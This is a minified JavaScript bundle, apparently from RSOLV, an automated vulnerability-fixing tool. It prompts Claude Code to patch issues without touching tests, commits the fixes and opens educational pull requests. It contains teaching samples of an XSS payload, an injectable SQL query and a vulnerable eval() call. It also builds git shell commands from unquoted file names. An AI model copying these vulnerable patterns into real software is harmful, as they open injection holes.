Your changes will be committed to git, so make them production-ready!`}constructStructuredPhasedPrompt(X,J){return`You are an expert security engineer fixing vulnerabilities. You MUST complete this task in TWO distinct phases:

## \uD83D\uDEA8 CRITICAL: FOLLOW THESE PHASES IN ORDER \uD83D\uDEA8

## PHASE 1: FILE EDITING (MANDATORY - DO THIS FIRST)


### Your Task:
1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${J.relatedFiles?.join(", ")||"To be discovered"}

2. Use Edit or MultiEdit tools to fix the vulnerable code
   - Make minimal, surgical changes
   - Preserve API compatibility
   - Fix all instances of the vulnerability

3. After editing, use Read tool to verify your changes were applied

4. Say "PHASE 1 COMPLETE: Files have been edited" when done

 IMPORTANT: You MUST complete Phase 1 before proceeding to Phase 2.
Do NOT skip directly to providing JSON.

## PHASE 2: JSON SUMMARY (ONLY AFTER PHASE 1)


Only after you've confirmed "PHASE 1 COMPLETE", provide the JSON summary:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test that validates the fix",
    "Description of test that ensures no regressions"
  ]
}
\`\`\`

## Execution Checklist:
 Used Edit/MultiEdit tools
 Verified changes with Read tool  
 Stated "PHASE 1 COMPLETE"
 Provided JSON summary

Remember: Edit files FIRST, then provide JSON. Do not provide JSON without editing.`}getSpecificVulnerabilityDetails(X){if(q.info("[DEBUG] getSpecificVulnerabilityDetails called"),q.info("[DEBUG] issueContext keys:",Object.keys(X||{})),q.info("[DEBUG] specificVulnerabilities present:",!!X.specificVulnerabilities),q.info("[DEBUG] specificVulnerabilities length:",X.specificVulnerabilities?.length||0),X.specificVulnerabilities&&X.specificVulnerabilities.length>0)q.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(!X.specificVulnerabilities||X.specificVulnerabilities.length===0)return q.warn("[DEBUG] No specific vulnerabilities found in issue context"),"";let J=`
## SPECIFIC VULNERABILITIES TO FIX
`;J+=`

`,J+=` You MUST fix ONLY these specific issues:

`;let Q={};return X.specificVulnerabilities.forEach((Y)=>{let W=Y.file||Y.path||"unknown";if(!Q[W])Q[W]=[];Q[W].push(Y)}),q.info("[DEBUG] Vulnerabilities grouped by file:",Object.keys(Q)),Object.entries(Q).forEach(([Y,W])=>{J+=`### File: ${Y}
`,W.forEach((z)=>{if(J+=`- **Line ${z.line}**: ${z.message||z.description}
`,z.snippet||z.code)J+=`  Code: \`${z.snippet||z.code}\`
`;if(z.remediation)J+=`  Fix: ${z.remediation}
`}),J+=`
`}),J+=` DO NOT fix issues in other files
`,J+=` DO NOT modify vendor/third-party libraries
`,J+=` Focus ONLY on the vulnerabilities listed above

`,q.info("[DEBUG] Generated vulnerability details section length:",J.length),J}getVulnerabilitySpecificGuidance(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y="";if(J.includes("insecure_deserialization")||J.includes("eval")||Q.includes("eval(")||Q.includes("deserializing"))Y+=`
## EVAL/DESERIALIZATION FIX GUIDANCE
`,Y+=`

`,Y+=`This vulnerability uses eval() which executes arbitrary code.

`,Y+=` CORRECT FIX:
`,Y+=`- For numbers: Use parseInt(value, 10) or parseFloat(value)
`,Y+=`- For JSON: Use JSON.parse(value)
`,Y+=`- For math: Use a safe expression evaluator
`,Y+=`- Check if there's a commented fix in the code!

`,Y+=` INCORRECT:
`,Y+=`- Trying to sanitize input for eval (still unsafe)
`,Y+=`- Using new Function() (also unsafe)

`,Y+=`Example:
`,Y+="```javascript\n",Y+=`// VULNERABLE: const value = eval(userInput);
`,Y+=`// FIXED: const value = parseInt(userInput, 10);
`,Y+="```\n\n";return Y}async constructPromptWithTestContext(X,J,Q,Y,W){q.info("[DEBUG] constructPromptWithTestContext called"),q.info("[DEBUG] Issue context:",{hasTitle:!!X.title,hasBody:!!X.body,hasSpecificVulnerabilities:!!X.specificVulnerabilities,vulnerabilityCount:X.specificVulnerabilities?.length||0});let z=`You are an expert security engineer fixing vulnerabilities.

## \uD83D\uDEA8 CRITICAL CONSTRAINTS - READ FIRST \uD83D\uDEA8


1. **NEVER MODIFY TEST FILES** - You must NEVER edit files in test/, spec/, or __tests__ directories
2. **NEVER BYPASS TESTS** - Do not change test code to make tests pass
3. **ONLY FIX IMPLEMENTATION** - Only modify the actual vulnerable code files
4. **If a test fails, fix the IMPLEMENTATION, not the test**
5. **Test files are READ-ONLY** - You may read them to understand requirements
6. **DO NOT modify vendor/third-party libraries** unless the vulnerability is specifically there

${this.getSpecificVulnerabilityDetails(X)}

## TEST EXECUTION CAPABILITY


You can run tests to verify your fix works:

\`\`\`bash
# Run all tests
npm test

# Run specific test file
npm test -- path/to/test.js

# Check if your changes fixed the vulnerability
npm test -- --grep "security"
\`\`\`

**IMPORTANT**:
- Use the Bash tool to run tests
- If tests fail, read the error output
- Adjust your fix based on test feedback
- You have 3 attempts to get tests passing
- DO NOT modify the tests to make them pass

${this.getVulnerabilitySpecificGuidance(X)}

`;try{let G=await this.testAwareEnhancement.enhanceContext(X,J,this.repoPath,{enabled:!0,vulnerableFilePath:J.relatedFiles?.[0],testDiscoveryRoot:this.repoPath,discoveryTimeout:30000,includeTestContent:!0,verbose:process.env.RSOLV_DEBUG_CONVERSATION==="true"});if(G){let H=this.testAwareEnhancement.generatePromptEnhancement(G);z+=H,q.info("[TestAware] Successfully added test-aware context to prompt")}else q.info("[TestAware] No test-aware context available, continuing without enhancement")}catch(G){q.warn("[TestAware] Failed to enhance prompt with test awareness:",G)}if(z+=this.constructPrompt(X,J),Q?.generatedTests?.success)z+=`

## Generated Tests
`,z+=`The following tests have been generated to validate your fix:

`,Q.generatedTests.tests.forEach((G)=>{z+=`### ${G.framework} Test
`,z+="```"+(G.framework==="rspec"?"ruby":"javascript")+`
`,z+=G.testCode,z+="\n```\n\n"}),z+=`**IMPORTANT**: Your fix must make these tests pass!
`,z+=`- RED test should fail before your fix
`,z+=`- GREEN test should pass after your fix
`,z+=`- REFACTOR test should ensure functionality is maintained
`;if(Y&&!Y.success){if(z+=`

## Previous Fix Attempt Failed
`,z+=`This is attempt ${W?.current||2} of ${W?.max||3}.

`,z+=`### Test Results:
`,z+="```\n",z+=`Vulnerable commit - Red test: ${Y.vulnerableCommit.redTestPassed?"PASSED":"FAILED"}
`,z+=`Fixed commit - Red test: ${Y.fixedCommit.redTestPassed?"PASSED":"FAILED"}
`,z+=`Fixed commit - Green test: ${Y.fixedCommit.greenTestPassed?"PASSED":"FAILED"}
`,z+=`Fixed commit - Refactor test: ${Y.fixedCommit.refactorTestPassed?"PASSED":"FAILED"}
`,z+="\n```\n\n",!Y.fixedCommit.redTestPassed)z+=`- The vulnerability still exists (RED test failed)
`;if(!Y.fixedCommit.greenTestPassed)z+=`- The fix was not properly applied (GREEN test failed)
`;if(!Y.fixedCommit.refactorTestPassed)z+=`- The fix broke existing functionality (REFACTOR test failed)
`;z+=`**Please analyze the test failures and try a different approach.**
`,z+=`Consider:
`,z+=`- Are you handling all edge cases?
`,z+=`- Is the fix too restrictive or breaking functionality?
`,z+=`- Do you need to adjust the implementation strategy?
`}if(W){if(z+=`

## Iteration Context
`,z+=`You have ${W.max-W.current} attempts remaining.
`,W.current===W.max)z+=`**This is your final attempt.** Ensure the fix is comprehensive.
`}return z+=`

## Test Validation Instructions
`,z+=`1. After implementing your fix, explain how to run the tests
`,z+=`2. Specify which test framework is being used
`,z+="3. Include the test command (e.g., `bundle exec rspec` or `npm test`)\n",z+=`4. Ensure all security tests pass before considering the fix complete
`,z}parsePhaseCompletion(X){let J=!1,Q=!1,Y=!1;for(let W of X){if(W.type==="text"&&W.text){if(W.text.includes("PHASE 1 COMPLETE"))J=!0;if(W.text.includes("```json"))Y=!0}if(W.type==="assistant"&&W.message?.content){for(let z of W.message.content)if(z.type==="text"&&z.text){if(z.text.includes("PHASE 1 COMPLETE"))J=!0;if(z.text.includes("```json"))Y=!0}}if(W.type==="tool_use"){if(W.name==="Edit"||W.name==="MultiEdit")Q=!0}if(W.type==="assistant"&&W.message?.content){for(let z of W.message.content)if(z.type==="tool_use"){if(z.name==="Edit"||z.name==="MultiEdit")Q=!0}}}return{phase1Complete:J,filesEdited:Q,jsonProvided:Y,success:J&&Q&&Y}}async generateSolutionWithGit(X,J,Q,Y,W,z){let G=Date.now();try{let H=this.getModifiedFiles();if(H.length>0)q.warn(`Repository has uncommitted changes: ${H.join(", ")}`);q.info("Executing Claude Code to fix vulnerabilities in-place..."),q.info("[DEBUG] About to construct prompt:",{hasTestResults:!!Y,hasValidationResult:!!W,hasIteration:!!z,issueContextKeys:Object.keys(X),hasSpecificVulnerabilities:!!X.specificVulnerabilities});let U=Y||W||z?await this.constructPromptWithTestContext(X,J,Y,W,z):Q;if(U){if(q.info("[DEBUG] Prompt includes SPECIFIC VULNERABILITIES:",U.includes("SPECIFIC VULNERABILITIES TO FIX")),U.includes("SPECIFIC VULNERABILITIES TO FIX")){let O=U.indexOf("SPECIFIC VULNERABILITIES TO FIX"),N=Math.min(O+1000,U.length);q.info("[DEBUG] Vulnerability section:",U.substring(O,N))}}let K=process.env.RSOLV_USE_CLI==="true"||this.claudeConfig?.useStructuredPhases||this.config.useVendedCredentials,V;if(K)q.info("Using Claude Code CLI adapter for file editing..."),V=await this.cliAdapter.generateSolution(X,J,U);else q.info("Using Claude Code SDK adapter for file editing..."),V=await super.generateSolution(X,J,U);if(process.env.RSOLV_DEBUG_CONVERSATION==="true"){if(q.warn("  DEBUG MODE: Conversation logging enabled - DO NOT USE IN PRODUCTION"),V.messages)q.info("=== CLAUDE CODE CONVERSATION START ==="),V.messages.forEach((O,N)=>{if(q.info(`Message ${N+1} (${O.type}):`),O.type==="text"&&O.text){let A=O.text.length>500?O.text.substring(0,500)+"...[truncated]":O.text;q.info(`  Text: ${A}`)}else if(O.type==="tool_use"){if(q.info(`  Tool: ${O.name}`),O.input?.path||O.input?.file_path)q.info(`  File: ${O.input.path||O.input.file_path}`);if(O.input?.old_string)q.info(`  Editing: ${O.input.old_string.substring(0,100)}...`)}else if(O.type==="assistant"&&O.message?.content)q.info(`  Assistant message with ${O.message.content.length} content items`)}),q.info("=== CLAUDE CODE CONVERSATION END ===")}if(!V.success)return{success:!1,message:V.message,error:V.error};if(this.claudeConfig?.useStructuredPhases&&V.messages&&!K){let O=this.parsePhaseCompletion(V.messages);if(!O.filesEdited)return{success:!1,message:"Phase 1 failed: No files were edited",error:"Phase 1 failed: The files were not edited before providing JSON. Claude must use Edit/MultiEdit tools first."};if(O.jsonProvided&&!O.phase1Complete)return{success:!1,message:"JSON was provided before completing Phase 1",error:"The files were not edited before providing JSON. Phase 1 must be completed first."};q.info(`Phase status - Phase 1: ${O.phase1Complete?"Complete":"Incomplete"}, Files edited: ${O.filesEdited}, JSON provided: ${O.jsonProvided}`)}let B=this.getModifiedFiles();if(process.env.RSOLV_DEBUG_CONVERSATION==="true")try{let O=h8("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"});q.info(`Git status output: ${O||"(no changes)"}`);let N=h8("pwd",{cwd:this.repoPath,encoding:"utf8"}).trim();q.info(`Working directory: ${N}`);let A=h8("ls -la",{cwd:this.repoPath,encoding:"utf8"});q.info(`Files in directory:
${A}`)}catch(O){q.error("Failed to get git debug info:",O)}if(B.length===0)return{success:!1,message:"No files were modified",error:"Claude Code did not make any file changes. The vulnerability may not exist or could not be located."};q.info(`Files modified by Claude Code: ${B.join(", ")}`);let Z=this.getDiffStats(),M;if(V.changes){if(V.changes.summary)try{M=JSON.parse(V.changes.summary)}catch(O){q.warn("Failed to parse summary JSON",O)}if(!M&&Object.keys(V.changes).length>0){let O=Object.values(V.changes)[0];if(typeof O==="string"&&O.includes("{"))try{M=JSON.parse(O)}catch(N){M={title:`Fix security vulnerability in ${B[0]}`,description:O}}}}let F=this.createCommitMessage(M?.title||`Fix security vulnerability in ${X.title}`,M?.description||V.message||"Applied security fixes",X.number),j=this.createCommit(B,F);return{success:!0,message:`Successfully fixed vulnerabilities in ${B.length} file(s)`,filesModified:B,commitHash:j,diffStats:Z,summary:M?{title:M.title,description:M.description,securityImpact:M.securityImpact||"Vulnerabilities have been patched",tests:M.testingGuidance||M.tests||[]}:{title:`Fix security vulnerability: ${X.title}`,description:V.message||"Security vulnerabilities fixed",securityImpact:"Vulnerabilities have been patched",tests:[]}}}catch(H){return q.error("Git-based solution generation failed",H),{success:!1,message:"Failed to generate solution",error:`Git-based solution generation failed: ${H instanceof Error?H.message:String(H)}`}}}getModifiedFiles(){try{let X=h8("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return X?X.split(`
`):[]}catch(X){return q.error("Failed to get modified files",X),[]}}getDiffStats(){try{let J=h8("git diff --stat",{cwd:this.repoPath,encoding:"utf-8"}).match(/(\d+) files? changed(?:, (\d+) insertions?\(\+\))?(?:, (\d+) deletions?\(-\))?/);if(J)return{filesChanged:parseInt(J[1],10),insertions:parseInt(J[2]||"0",10),deletions:parseInt(J[3]||"0",10)};return{filesChanged:0,insertions:0,deletions:0}}catch(X){return q.error("Failed to get diff stats",X),{filesChanged:0,insertions:0,deletions:0}}}createCommit(X,J){try{try{h8("git config user.email",{cwd:this.repoPath})}catch{h8('git config user.email "rsolv@users.noreply.github.com"',{cwd:this.repoPath}),h8('git config user.name "RSOLV Bot"',{cwd:this.repoPath})}h8(`git add ${X.join(" ")}`,{cwd:this.repoPath});let Q=m0("fs"),Y=m0("os"),z=m0("path").join(Y.tmpdir(),`commit-msg-${Date.now()}.txt`);Q.writeFileSync(z,J);try{h8(`git commit -F "${z}"`,{cwd:this.repoPath})}finally{try{Q.unlinkSync(z)}catch{}}let G=h8("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();return q.info(`Created commit ${G.substring(0,8)}: ${J.split(`
`)[0]}`),G}catch(Q){throw q.error("Failed to create commit",Q),Q}}createCommitMessage(X,J,Q){return`${X}

${J}

Fixes #${Q}

This commit was automatically generated by RSOLV to fix security vulnerabilities.`}}});import{execSync as E7}from"child_process";async function l2(X,J,Q,Y,W){try{q.info(`Creating educational PR from commit ${J.substring(0,8)} for issue #${X.number}`);try{E7("git config user.email",{cwd:process.cwd()})}catch{q.info("Configuring git user for GitHub Actions"),E7('git config user.email "rsolv@users.noreply.github.com"',{cwd:process.cwd()}),E7('git config user.name "RSOLV Bot"',{cwd:process.cwd()})}let z=`rsolv/fix-issue-${X.number}`;try{E7(`git checkout -b ${z}`,{cwd:process.cwd()}),q.info(`Created branch: ${z}`)}catch(B){E7(`git checkout ${z}`,{cwd:process.cwd()}),q.info(`Switched to existing branch: ${z}`)}try{E7(`git push -u origin ${z}`,{cwd:process.cwd()}),q.info(`Pushed branch: ${z}`)}catch(B){q.warn("Failed to push branch, may already exist",B)}let G=Ou1(Q,X),H=Ru1(X,Q,G,W),U=c0(),[K,V]=X.repository.fullName.split("/");try{let{data:B}=await U.pulls.create({owner:K,repo:V,title:`[RSOLV] ${Q.title} (fixes #${X.number})`,body:H,head:z,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(q.info(`Created educational pull request #${B.number}: ${B.html_url}`),Y.rsolvApiKey)try{await new P6(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:z,commitHash:J,metadata:{hasEducationalContent:!0,vulnerabilityType:Q.vulnerabilityType,severity:Q.severity}}),q.info("Tracked educational fix in RSOLV API")}catch(Z){q.warn("Failed to track in RSOLV API",Z)}return{success:!0,message:`Created educational pull request #${B.number}`,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:z,commitHash:J,educationalContent:G}}catch(B){if(B.status===422&&B.message?.includes("pull request already exists")){q.warn("Pull request already exists for this branch");let{data:Z}=await U.pulls.list({owner:K,repo:V,head:`${K}:${z}`,state:"open"});if(Z.length>0){let M=Z[0];return{success:!0,message:`Pull request already exists: #${M.number}`,pullRequestUrl:M.html_url,pullRequestNumber:M.number,branchName:z,commitHash:J,educationalContent:G}}}throw B}}catch(z){return q.error("Failed to create educational pull request",z),{success:!1,message:"Failed to create pull request",error:z instanceof Error?z.message:String(z)}}}function Ou1(X,J){let Q=[],Y=X.vulnerabilityType?.toUpperCase()||"SECURITY",W=c2[Y]||c2.XSS;if(Q.push(`## What is ${W.title}?`),Q.push(W.description),Q.push(""),Q.push("## How this fix prevents the vulnerability:"),Q.push(W.prevention),W.example)Q.push(""),Q.push("**Example:**"),Q.push(W.example);if(Q.push(""),Q.push("## Best practices:"),Q.push("- Always validate and sanitize user input"),Q.push("- Apply the principle of least privilege"),Q.push("- Keep dependencies updated"),Q.push("- Implement security headers"),Q.push("- Use security linters and scanners in CI/CD"),X.isAiGenerated||Y==="SLOPSQUATTING")Q.push(""),Q.push("## \uD83E\uDD16 AI-Specific Vulnerability Context"),Q.push("This vulnerability is related to AI-generated code. Our research shows:"),Q.push("- 19.6% of AI package suggestions are hallucinated (non-existent)"),Q.push("- Attackers actively exploit these by registering malicious packages"),Q.push("- Always verify package existence before adding dependencies");return Q.push(""),Q.push("## About RSOLV"),Q.push("RSOLV automatically fixes security vulnerabilities, not just detects them."),Q.push("- 181 patterns across 8 languages and frameworks"),Q.push("- Success-based pricing: only pay for deployed fixes"),Q.push("- Detects AI-specific vulnerabilities others miss"),Q.push("- AST-based analysis for minimal false positives"),Q.join(`
`)}function Ru1(X,J,Q,Y){let W=[];if(W.push(`# ${J.title}`),W.push(""),W.push(`**Fixes:** #${X.number}`),W.push(`**Severity:** ${J.severity||"Medium"}`),J.cwe)W.push(`**CWE:** ${J.cwe}`);if(W.push(""),W.push("## \uD83D\uDCDD Summary"),W.push(J.description),W.push(""),Y&&Y.filesChanged>0)W.push("## \uD83D\uDCCA Changes Made"),W.push(`- **Files Changed:** ${Y.filesChanged}`),W.push(`- **Lines Added:** +${Y.insertions}`),W.push(`- **Lines Removed:** -${Y.deletions}`),W.push("");W.push("## \uD83D\uDCDA Understanding This Fix"),W.push("");let z=J.vulnerabilityType?.toUpperCase()||"SECURITY",G=c2[z]||c2.XSS;if(W.push(`### \uD83D\uDEE1 What is ${G.title}?`),W.push(G.description),W.push(""),W.push("### \uD83D\uDD27 How This Fix Works"),W.push(G.prevention),G.example)W.push(""),W.push("**Example:**"),W.push("```"),W.push(G.example),W.push("```");if(W.push(""),W.push("###  Best Practices"),W.push("1. Always validate and sanitize user input"),W.push("2. Apply the principle of least privilege"),W.push("3. Keep dependencies updated"),W.push("4. Implement security headers"),W.push("5. Use security linters and scanners in CI/CD"),W.push(""),J.tests&&J.tests.length>0)W.push("## \uD83E\uDDEA Testing Instructions"),J.tests.forEach((H,U)=>{W.push(`${U+1}. ${H}`)}),W.push("");return W.push("##  Review Checklist"),W.push("- [ ] Changes fix the reported vulnerability"),W.push("- [ ] No new vulnerabilities introduced"),W.push("- [ ] Existing functionality preserved"),W.push("- [ ] Code follows project conventions"),W.push("- [ ] Tests pass (if applicable)"),W.push(""),W.push("## \uD83E\uDD16 About RSOLV"),W.push(""),W.push("[RSOLV](https://rsolv.dev) automatically fixes security vulnerabilities in your code."),W.push(""),W.push("**What makes RSOLV different:**"),W.push("- \uD83D\uDD27 **Fixes, not just reports:** We generate working code, not just vulnerability lists"),W.push("- \uD83D\uDCB0 **Success-based pricing:** Only pay for fixes that get deployed"),W.push("- \uD83E\uDD16 **AI-aware security:** Detect vulnerabilities specific to AI-generated code"),W.push("- \uD83C\uDFAF **181+ patterns:** Comprehensive coverage across 8 languages and frameworks"),W.push("- \uD83C\uDF33 **AST-based analysis:** Minimal false positives through syntax tree parsing"),W.push(""),W.push("---"),W.push(""),W.push("*This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing.*"),W.push(`*Learn more about ${G.title} on [OWASP](https://owasp.org)*`),W.join(`
`)}var c2;var J3=j1(()=>{t1();i8();c2={XSS:{title:"Cross-Site Scripting (XSS)",description:"XSS allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, defacement, or redirection to malicious sites.",prevention:"Always sanitize user input, use Content Security Policy (CSP), encode output, and validate input on both client and server sides.",example:'`<script>alert("XSS")</script>` becomes `&lt;script&gt;alert("XSS")&lt;/script&gt;`'},SQLi:{title:"SQL Injection",description:"SQL injection allows attackers to interfere with database queries, potentially reading sensitive data, modifying database data, or executing administrative operations.",prevention:"Use parameterized queries/prepared statements, validate input types, apply least privilege principle to database accounts, and avoid dynamic SQL construction.",example:'Instead of `query("SELECT * FROM users WHERE id = " + userId)`, use parameterized: `query("SELECT * FROM users WHERE id = ?", [userId])`'},slopsquatting:{title:"Slopsquatting (AI-Specific Vulnerability)",description:"Slopsquatting exploits AI code generation tools that hallucinate non-existent package names. Attackers register these packages to inject malicious code. Our research shows 19.6% of AI package suggestions are hallucinated.",prevention:"Always verify package existence before adding dependencies, use package registries with verification, and implement dependency scanning in CI/CD pipelines.",example:'AI might suggest `import { validateInput } from "secure-validator"` where "secure-validator" doesn\'t exist, allowing attackers to register it.'},CSRF:{title:"Cross-Site Request Forgery (CSRF)",description:"CSRF tricks authenticated users into executing unwanted actions. An attacker can force users to perform state-changing requests like transferring funds or changing email addresses.",prevention:"Implement anti-CSRF tokens, use SameSite cookie attribute, verify Origin/Referer headers, and require re-authentication for sensitive actions."},XXE:{title:"XML External Entity (XXE) Injection",description:"XXE attacks exploit vulnerabilities in XML parsers to access local or remote files, perform SSRF attacks, or cause denial of service.",prevention:"Disable external entity processing in XML parsers, use less complex data formats like JSON when possible, and validate/sanitize XML input."}}});import{execSync as p2}from"child_process";async function d2(X,J,Q,Y,W){try{q.info(`Creating pull request from commit ${J.substring(0,8)} for issue #${X.number}`);let z=`rsolv/fix-issue-${X.number}`,G=await Au1(J,z,Y);if(!G.success)return{success:!1,message:"Failed to push changes",error:G.error};let H=Nu1(X,Q,W),U=c0(),[K,V]=X.repository.fullName.split("/");try{let{data:B}=await U.pulls.create({owner:K,repo:V,title:`[RSOLV] ${Q.title} (fixes #${X.number})`,body:H,head:z,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(q.info(`Created pull request #${B.number}: ${B.html_url}`),Y.rsolvApiKey)try{await new P6(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:z,commitHash:J}),q.info("Tracked fix attempt in RSOLV API")}catch(Z){q.warn("Failed to track fix attempt in RSOLV API",Z)}return{success:!0,message:`Created pull request #${B.number}`,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:z,commitHash:J}}catch(B){if(B.status===422&&B.message?.includes("pull request already exists")){q.warn("Pull request already exists for this branch");let{data:Z}=await U.pulls.list({owner:K,repo:V,head:`${K}:${z}`,state:"open"});if(Z.length>0){let M=Z[0];return{success:!0,message:`Pull request already exists: #${M.number}`,pullRequestUrl:M.html_url,pullRequestNumber:M.number,branchName:z,commitHash:J}}}throw B}}catch(z){return q.error("Failed to create pull request from git",z),{success:!1,message:"Failed to create pull request",error:z instanceof Error?z.message:String(z)}}}async function Au1(X,J,Q){try{return p2(`git checkout -b ${J} ${X}`,{encoding:"utf-8"}),q.info(`Created branch ${J} from commit ${X.substring(0,8)}`),p2(`git push origin ${J}`,{encoding:"utf-8"}),q.info(`Pushed branch ${J} to origin`),p2("git checkout -",{encoding:"utf-8"}),{success:!0}}catch(Y){q.error("Failed to push branch",Y);try{p2("git checkout -",{encoding:"utf-8"})}catch(W){}return{success:!1,error:Y instanceof Error?Y.message:String(Y)}}}function Nu1(X,J,Q){let Y=[];if(Y.push(`# ${J.title}
`),Y.push(`**Fixes:** #${X.number}
`),Y.push(`## Summary
`),Y.push(J.description),Y.push(""),Q&&Q.filesChanged>0)Y.push(`## Changes Made
`),Y.push(`- **Files Changed:** ${Q.filesChanged}`),Y.push(`- **Lines Added:** ${Q.insertions}`),Y.push(`- **Lines Removed:** ${Q.deletions}`),Y.push("");if(J.vulnerabilityDetails){if(Y.push(`## Security Details
`),Y.push(`- **Vulnerability Type:** ${J.vulnerabilityDetails.type}`),Y.push(`- **Severity:** ${J.vulnerabilityDetails.severity}`),J.vulnerabilityDetails.cwe)Y.push(`- **CWE:** ${J.vulnerabilityDetails.cwe}`);Y.push("")}if(J.securityImpact)Y.push(`## Security Impact
`),Y.push(J.securityImpact),Y.push("");if(J.tests&&J.tests.length>0)Y.push(`## Testing Instructions
`),J.tests.forEach((W,z)=>{Y.push(`${z+1}. ${W}`)}),Y.push("");return Y.push(`## Review Checklist
`),Y.push("- [ ] Changes fix the reported vulnerability"),Y.push("- [ ] No new vulnerabilities introduced"),Y.push("- [ ] Existing functionality preserved"),Y.push("- [ ] Code follows project conventions"),Y.push("- [ ] Tests pass (if applicable)"),Y.push(""),Y.push(`---
`),Y.push("This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing."),Y.push(`Issue: #${X.number}`),Y.join(`
`)}var Q3=j1(()=>{t1();i8()});async function ED(X){try{q.info("Detecting issues for automation");let J=process.env.GITHUB_REPOSITORY||"",[Q,Y]=J.split("/");if(!Q||!Y)throw new Error("Repository information not available in environment variables");let W=await U5(Q,Y),z=process.env.RSOLV_ISSUE_NUMBER;if(z){q.info(`Processing specific issue #${z}`);let B=await Du1(Q,Y,parseInt(z));return(B?[B]:[]).map((F)=>({id:`github-${F.id}`,number:F.number,title:F.title,body:F.body??"",labels:F.labels.map((j)=>typeof j==="string"?j:j.name),assignees:F.assignees?.map((j)=>j.login)||[],repository:{owner:Q,name:Y,fullName:J,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:F.created_at,updatedAt:F.updated_at,metadata:{htmlUrl:F.html_url,state:F.state,locked:F.locked,draft:F.draft}}))}let G=[X.issueLabel];if(!X.issueLabel.includes("rsolv"))G.push("rsolv");let H=[],U=new Set,K=X.maxIssues;for(let B of G){let Z=K?K-H.length:void 0;if(Z===0)break;let M=await Lu1(Q,Y,B,Z);for(let F of M)if(!U.has(F.id)){if(U.add(F.id),H.push(F),K&&H.length>=K)break}if(K&&H.length>=K){q.info(`Reached max_issues limit of ${K}, stopping issue detection`);break}}return q.info(`Found ${H.length} issues with labels: ${G.join(" or ")}`),H.map((B)=>({id:`github-${B.id}`,number:B.number,title:B.title,body:B.body??"",labels:B.labels.map((Z)=>typeof Z==="string"?Z:Z.name),assignees:B.assignees?.map((Z)=>Z.login)||[],repository:{owner:Q,name:Y,fullName:J,defaultBranch:W.defaultBranch,language:W.language},source:"github",createdAt:B.created_at,updatedAt:B.updated_at,metadata:{htmlUrl:B.html_url,state:B.state,locked:B.locked,draft:B.draft}}))}catch(J){throw q.error("Error detecting issues",J),new Error(`Failed to detect issues: ${J instanceof Error?J.message:String(J)}`)}}async function Lu1(X,J,Q,Y){try{let W=c0(),z=Y?Math.min(Y,100):100,{data:G}=await W.issues.listForRepo({owner:X,repo:J,labels:Q,state:"open",per_page:z}),H=G.filter((U)=>!U.pull_request);if(Y&&H.length>Y)return H.slice(0,Y);return H}catch(W){throw q.error(`Error getting issues with label ${Q}`,W),new Error(`Failed to get issues with label: ${W instanceof Error?W.message:String(W)}`)}}async function Du1(X,J,Q){try{let Y=await c0(),{data:W}=await Y.issues.get({owner:X,repo:J,issue_number:Q});if(W.pull_request)return q.warn(`Issue #${Q} is actually a pull request, skipping`),null;return W}catch(Y){if(q.error(`Error getting issue #${Q}`,Y),Y.status===404)return q.warn(`Issue #${Q} not found`),null;throw new Error(`Failed to get issue: ${Y instanceof Error?Y.message:String(Y)}`)}}var $D=j1(()=>{t1();i8()});class $Q{autofixLabel;rsolvLabel;constructor(X){this.autofixLabel=X.autofixLabel||"autofix",this.rsolvLabel=X.rsolvLabel||"rsolv"}validateConfig(X,J){let Q=J.filter((Y)=>!X[Y]);if(Q.length>0)throw new Error(`Missing required configuration fields: ${Q.join(", ")}`)}async makeRequest(X,J={}){try{let Q=await fetch(X,{...J,headers:{...this.getAuthHeaders(),...J.headers}});if(!Q.ok)throw new Error(`HTTP ${Q.status}: ${Q.statusText}`);return Q}catch(Q){throw q.error(`Platform API request failed: ${X}`,Q),Q}}hasRsolvLabels(X){let J=X.map((Q)=>Q.toLowerCase());return J.includes(this.autofixLabel.toLowerCase())||J.includes(this.rsolvLabel.toLowerCase())}extractIssueId(X){let J=[/^#?(\d+)$/,/^([A-Z]+-\d+)$/,/^([A-Z]+-\d+)$/i,/\/(\d+)\/?$/,/\/([A-Z]+-\d+)\/?$/i];for(let Q of J){let Y=X.match(Q);if(Y)return Y[1]}return X}formatError(X,J){let Q=J?.message||J?.toString()||"Unknown error";return`${X} failed: ${Q}`}}var Y3=j1(()=>{t1()});var W3;var kD=j1(()=>{Y3();t1();W3=class W3 extends $Q{config;baseUrl;authHeader;constructor(X){super(X);this.config=X;this.validateConfig(X,["host","email","apiToken"]),this.baseUrl=`https://${X.host}/rest/api/3`,this.authHeader=`Basic ${Buffer.from(`${X.email}:${X.apiToken}`).toString("base64")}`}getAuthHeaders(){return{Authorization:this.authHeader,Accept:"application/json","Content-Type":"application/json"}}async authenticate(){try{await this.makeRequest(`${this.baseUrl}/myself`),q.info("Successfully authenticated with Jira")}catch(X){throw new Error(this.formatError("Jira authentication",X))}}async searchIssues(X){try{return(await(await this.makeRequest(`${this.baseUrl}/search`,{method:"POST",body:JSON.stringify({jql:X,fields:["summary","description","labels","status","created","updated","assignee","reporter"]})})).json()).issues.map((Y)=>this.convertToUnifiedIssue(Y))}catch(J){throw new Error(this.formatError("Jira issue search",J))}}async getIssue(X){try{let 